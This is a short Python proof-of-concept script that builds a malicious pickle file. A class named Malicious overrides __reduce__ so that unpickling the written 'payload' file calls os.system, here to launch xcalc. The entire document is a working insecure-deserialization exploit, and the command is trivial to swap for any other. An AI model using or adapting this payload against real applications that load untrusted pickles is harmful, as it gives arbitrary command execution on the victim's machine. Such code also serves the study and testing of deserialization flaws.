#!/usr/bin/env python3

import pickle, os

class Malicious():
	def __reduce__(self):
		return (os.system, ("xcalc",))

pickle.dump(Malicious(), open("payload", "wb"))
